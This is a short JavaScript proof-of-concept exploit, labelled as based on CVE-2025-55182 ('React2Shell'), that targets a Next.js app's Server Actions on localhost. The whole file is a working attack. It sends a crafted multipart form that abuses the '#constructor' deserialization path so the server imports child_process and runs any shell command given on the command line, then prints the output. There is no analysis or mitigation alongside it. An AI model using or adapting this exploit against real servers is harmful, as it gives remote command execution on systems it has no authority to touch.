// Modified exploit for the actual Server Action ID
// Based on CVE-2025-55182 (React2Shell)

async function pwn(cmd = 'id') {
  const formData = new FormData();
  formData.append('0', '"$F1"');

  // Use the actual Server Action ID from our Next.js app
  formData.append('1', '{"id":"3f5cfa7a36e1f09a9bfde822aa74ba68839e1d7d#constructor","bound":"$@2"}');

  let susCode = `const cmd = ${JSON.stringify(cmd)};`
  susCode += `
  return import('child_process').then(cp => {
    const output = cp.execSync(cmd).toString();
    return output;
  }).catch(e => console.log('err:', e.message));`;
  formData.append('2', `["${JSON.stringify(susCode).slice(1, -1)}"]`);

  try {
    const response = await fetch('http://localhost:3000', {
      method: 'POST',
      body: formData
    });

    const text = await response.text();
    console.log("Response:", text);
    process.exit(0);
  } catch (e) {
    console.error("Request failed:", e);
    process.exit(1);
  }
}

const args = process.argv.slice(2).join(' ');
pwn(args);
